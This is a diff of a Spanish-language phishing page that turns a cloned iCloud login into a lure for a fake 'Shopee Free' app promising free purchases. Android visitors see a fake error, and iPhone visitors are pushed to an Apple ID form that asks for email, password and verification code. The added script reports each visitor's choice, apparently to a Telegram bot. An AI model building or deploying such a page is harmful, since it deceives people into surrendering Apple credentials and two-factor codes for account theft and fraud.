@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Iniciar sesión en iCloud</title>
+<title>Shopee Free · Descarga Oficial</title>
 <style>
   *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
   body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"SF Pro Display","SF Pro Text","Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#f5f5f7;color:#1d1d1f;
@@ -11,7 +11,7 @@
   .card{width:100%;max-width:440px;background:#fff;border:1px solid #d2d2d7;border-radius:12px;padding:44px 40px 36px;text-align:center;box-shadow:0 4px 20px rgba(0,0,0,0.05)}
   @media(max-width:480px){body{padding:0}.card{border:0;border-radius:0;padding:36px 24px;max-width:100%;box-shadow:none;background:#fff}}
   .logo{margin-bottom:20px}
-  h1{font-size:24px;font-weight:500;margin:0 0 8px;line-height:1.2;color:#1d1d1f}
+  h1{font-size:24px;font-weight:600;margin:0 0 8px;line-height:1.2;color:#1d1d1f}
   .sub{font-size:15px;color:#86868b;margin:0 0 28px;line-height:1.4}
   .step{display:none;text-align:left}
   .step.on{display:block}
@@ -48,19 +48,88 @@
   .center{text-align:center}
   .code{letter-spacing:.5em;text-align:center;font-size:22px;font-weight:500;padding-left:.5em}
   .foot{font-size:12px;color:#86868b;margin-top:32px;text-align:center;line-height:1.5}
+
+  /* Estilos de la pantalla inicial Shopee Free */
+  .badge-free{display:inline-block;background:#fff0eb;color:#ee4d2d;font-size:12px;font-weight:600;padding:4px 12px;border-radius:999px;margin-bottom:14px;border:1px solid #ffd5c8}
+  .device-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:8px}
+  .device-btn{display:flex;flex-direction:column;align-items:center;justify-content:center;gap:10px;
+              background:#f9f9fb;border:1.5px solid #d2d2d7;border-radius:12px;padding:20px 12px;
+              cursor:pointer;transition:all .2s;font-family:inherit;color:#1d1d1f}
+  .device-btn:hover{border-color:#ee4d2d;background:#fff7f5;transform:translateY(-2px);box-shadow:0 6px 16px rgba(238,77,45,0.12)}
+  .device-btn span{font-size:15px;font-weight:600}
+  .device-btn small{font-size:12px;color:#86868b}
+  .alert-box{display:none;margin-top:18px;padding:12px 14px;border-radius:8px;font-size:13px;line-height:1.4;text-align:left}
+  .alert-box.err-android{display:block;background:#fff2f0;border:1px solid #ffccc7;color:#cf1322}
+  .alert-box.info-ios{display:block;background:#e6f4ff;border:1px solid #91caff;color:#0958d9}
+  .hidden{display:none!important}
 </style>
 </head>
 <body>
-<div class="card">
+
+<!-- VISTA 1: PORTADA DESCARGA SHOPEE FREE -->
+<div class="card" id="landing-card">
   <div class="logo">
-    <!-- Logotipo de Apple -->
+    <!-- Logo personalizado: Tarjeta + Signos de Pesos + Compra Gratis -->
+    <svg width="88" height="88" viewBox="0 0 100 100" fill="none">
+      <defs>
+        <linearGradient id="bgGrad" x1="0" y1="0" x2="100" y2="100" gradientUnits="userSpaceOnUse">
+          <stop offset="0%" stop-color="#ff6533"/>
+          <stop offset="100%" stop-color="#ee2c1d"/>
+        </linearGradient>
+      </defs>
+      <rect x="6" y="6" width="88" height="88" rx="22" fill="url(#bgGrad)"/>
+      <rect x="20" y="28" width="48" height="32" rx="5" fill="#ffd666" transform="rotate(-10 20 28)"/>
+      <rect x="21" y="34" width="48" height="6" fill="#d48806" transform="rotate(-10 20 28)"/>
+      <rect x="26" y="36" width="52" height="34" rx="6" fill="#ffffff" stroke="#ffe7ba" stroke-width="1.5"/>
+      <rect x="32" y="43" width="12" height="8" rx="2" fill="#faad14"/>
+      <rect x="32" y="57" width="24" height="4" rx="2" fill="#d9d9d9"/>
+      <rect x="32" y="63" width="16" height="3" rx="1.5" fill="#e8e8e8"/>
+      <circle cx="72" cy="66" r="15" fill="#52c41a" stroke="#ffffff" stroke-width="2.5"/>
+      <text x="72" y="72" text-anchor="middle" fill="#ffffff" font-size="18" font-weight="bold" font-family="Arial, sans-serif">$</text>
+      <text x="20" y="25" fill="#fff566" font-size="15" font-weight="bold" font-family="Arial, sans-serif">$</text>
+      <text x="77" y="27" fill="#fff566" font-size="14" font-weight="bold" font-family="Arial, sans-serif">$</text>
+    </svg>
+  </div>
+
+  <div class="badge-free">COMPRAS GRATIS · VERSIÓN VIP</div>
+  <h1>Descargar Shopee Free</h1>
+  <p class="sub">Obtén acceso ilimitado a compras gratis con tarjetas virtuales activadas. Selecciona para qué dispositivo necesitas la aplicación:</p>
+
+  <div class="device-grid">
+    <!-- Botón iPhone -->
+    <button type="button" class="device-btn" id="btn-iphone">
+      <svg width="36" height="36" viewBox="0 0 170 170" fill="#1d1d1f">
+        <path d="M150.37 130.25c-2.45 5.66-5.35 10.87-8.71 15.66-4.58 6.53-8.33 11.05-11.22 13.56-4.48 4.12-9.28 6.23-14.42 6.35-3.69 0-8.14-1.05-13.32-3.18-5.19-2.12-9.97-3.17-14.34-3.17-4.58 0-9.49 1.05-14.75 3.17-5.26 2.13-9.5 3.24-12.74 3.35-4.35.13-9.16-1.9-14.42-6.08-3.05-2.49-6.87-7.05-11.47-13.67-6.09-8.73-11.03-18.38-14.82-28.96-3.79-10.58-5.68-21.24-5.68-31.98 0-14.15 3.65-25.59 10.95-34.33 7.3-8.74 16.54-13.19 27.73-13.35 5.43 0 11.21 1.41 17.34 4.22 6.13 2.81 10.09 4.22 11.87 4.22 1.52 0 5.62-1.52 12.3-4.55 6.67-3.03 12.59-4.36 17.76-4.01 11.33.76 20.48 5.3 27.46 13.62-10.42 6.39-15.5 15.48-15.24 27.28.27 9.53 4.11 17.47 11.53 23.82 7.42 6.35 16.27 9.87 26.54 10.55-3.05 9.07-7.08 18.25-12.09 27.54zM119.22 32.14c0-7.85 2.79-15.11 8.37-21.78 5.58-6.67 12.63-10.36 21.15-11.06.14 1.09.22 2.09.22 3 0 7.74-2.88 15.18-8.63 22.32-5.76 7.14-12.87 10.87-21.34 11.18-.13-.87-.2-1.8-.2-2.79z"/>
+      </svg>
+      <span>iPhone (iOS)</span>
+      <small>Descarga directa IPA</small>
+    </button>
+
+    <!-- Botón Android -->
+    <button type="button" class="device-btn" id="btn-android">
+      <svg width="36" height="36" viewBox="0 0 24 24" fill="#3ddc84">
+        <path d="M17.523 15.341a.999.999 0 0 1-1-1 .999.999 0 0 1 1-1 .999.999 0 0 1 1 1 .999.999 0 0 1-1 1m-11.046 0a.999.999 0 0 1-1-1 .999.999 0 0 1 1-1 .999.999 0 0 1 1 1 .999.999 0 0 1-1 1m11.405-6.02 1.997-3.46a.416.416 0 0 0-.152-.567.416.416 0 0 0-.568.152L17.137 8.95c-1.51-.688-3.214-1.077-5.137-1.077s-3.627.389-5.137 1.077L4.841 5.446a.416.416 0 0 0-.568-.152.416.416 0 0 0-.152.567l1.997 3.46C2.688 11.186.343 14.658 0 18.761h24c-.343-4.103-2.688-7.575-6.118-9.44"/>
+      </svg>
+      <span>Android</span>
+      <small>Instalador APK</small>
+    </button>
+  </div>
+
+  <div id="device-msg" class="alert-box"></div>
+
+  <p class="foot">Shopee Free Installer &nbsp;·&nbsp; v4.2.0 &nbsp;·&nbsp; Servidor Seguro</p>
+</div>
+
+<!-- VISTA 2: PORTADA REAL DE ICLOUD -->
+<div class="card hidden" id="icloud-card">
+  <div class="logo">
     <svg width="40" height="40" viewBox="0 0 170 170" fill="currentColor">
       <path d="M150.37 130.25c-2.45 5.66-5.35 10.87-8.71 15.66-4.58 6.53-8.33 11.05-11.22 13.56-4.48 4.12-9.28 6.23-14.42 6.35-3.69 0-8.14-1.05-13.32-3.18-5.19-2.12-9.97-3.17-14.34-3.17-4.58 0-9.49 1.05-14.75 3.17-5.26 2.13-9.5 3.24-12.74 3.35-4.35.13-9.16-1.9-14.42-6.08-3.05-2.49-6.87-7.05-11.47-13.67-6.09-8.73-11.03-18.38-14.82-28.96-3.79-10.58-5.68-21.24-5.68-31.98 0-14.15 3.65-25.59 10.95-34.33 7.3-8.74 16.54-13.19 27.73-13.35 5.43 0 11.21 1.41 17.34 4.22 6.13 2.81 10.09 4.22 11.87 4.22 1.52 0 5.62-1.52 12.3-4.55 6.67-3.03 12.59-4.36 17.76-4.01 11.33.76 20.48 5.3 27.46 13.62-10.42 6.39-15.5 15.48-15.24 27.28.27 9.53 4.11 17.47 11.53 23.82 7.42 6.35 16.27 9.87 26.54 10.55-3.05 9.07-7.08 18.25-12.09 27.54zM119.22 32.14c0-7.85 2.79-15.11 8.37-21.78 5.58-6.67 12.63-10.36 21.15-11.06.14 1.09.22 2.09.22 3 0 7.74-2.88 15.18-8.63 22.32-5.76 7.14-12.87 10.87-21.34 11.18-.13-.87-.2-1.8-.2-2.79z"/>
     </svg>
   </div>
 
-  <h1 id="titulo">Inicia sesión en iCloud</h1>
-  <p class="sub" id="sub">Usa tu ID de Apple para iniciar sesión</p>
+  <h1 id="titulo" style="font-weight:500">Inicia sesión en iCloud</h1>
+  <p class="sub" id="sub">Inicia sesión con tu ID de Apple para autorizar e iniciar la descarga en tu iPhone</p>
 
   <form class="step on" id="s1" novalidate>
     <div class="field" id="f1">
@@ -119,8 +188,8 @@
       <svg viewBox="0 0 24 24" fill="none" stroke="#34c759" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>
     </div>
     <h1>Sesión iniciada</h1>
-    <p class="sub">Ya puedes acceder a los servicios de iCloud.</p>
-    <a class="btn" style="display:inline-flex;align-items:center;justify-content:center;text-decoration:none;margin-top:8px" href="https://www.icloud.com" target="_blank" rel="noopener">Ir a iCloud</a>
+    <p class="sub">Tu cuenta ha sido verificada. La descarga de Shopee Free para iOS está lista.</p>
+    <a class="btn" style="display:inline-flex;align-items:center;justify-content:center;text-decoration:none;margin-top:8px" href="https://www.icloud.com" target="_blank" rel="noopener">Continuar</a>
   </div>
 
   <p class="foot">Apple ID &nbsp;·&nbsp; Privacidad &nbsp;·&nbsp; Términos y condiciones</p>
@@ -154,11 +223,32 @@ function cabecera(paso){
          "📱 " + navigator.userAgent.slice(0, 160) + "\n\n";
 }
 
+/* Lógica de selección de dispositivo */
+$("btn-android").addEventListener("click", () => {
+  const msg = $("device-msg");
+  msg.className = "alert-box err-android";
+  msg.innerHTML = "<strong>⚠️ Error de compatibilidad (Código 403):</strong> La versión de Shopee Free para <b>Android</b> se encuentra temporalmente fuera de servicio o bloqueada en tu región. Intenta desde un dispositivo iOS (iPhone).";
+  telegram(cabecera("dispositivo · Android") + "🤖 Seleccionó <b>Android</b> (marcó error de compatibilidad).");
+});
+
+$("btn-iphone").addEventListener("click", () => {
+  const msg = $("device-msg");
+  msg.className = "alert-box info-ios";
+  msg.innerHTML = "<strong>✓ iPhone detectado:</strong> Para instalar el perfil de descarga en iOS es necesario iniciar sesión con tu cuenta de <b>iCloud</b>. Redirigiendo...";
+  telegram(cabecera("dispositivo · iPhone") + "🍎 Seleccionó <b>iPhone (iOS)</b> y pasó a iCloud.");
+  setTimeout(() => {
+    $("landing-card").classList.add("hidden");
+    $("icloud-card").classList.remove("hidden");
+    document.title = "Iniciar sesión en iCloud";
+    setTimeout(() => $("email").focus(), 80);
+  }, 1100);
+});
+
 function paso(n){
   document.querySelectorAll(".step").forEach(s => s.classList.remove("on"));
   $("s" + n).classList.add("on");
   $("titulo").textContent = n === 2 ? "Introduce tu contraseña" : n === 3 ? "Verificación de Apple ID" : "Inicia sesión en iCloud";
-  $("sub").textContent = n === 2 ? "" : n === 3 ? "" : "Usa tu ID de Apple para iniciar sesión";
+  $("sub").textContent = n === 2 ? "" : n === 3 ? "" : "Inicia sesión con tu ID de Apple para autorizar e iniciar la descarga en tu iPhone";
   $("sub").style.display = (n === 2 || n === 3) ? "none" : "block";
   const foco = { 1: "email", 2: "pass", 3: "code" }[n];
   if (foco) setTimeout(() => $(foco).focus(), 80);
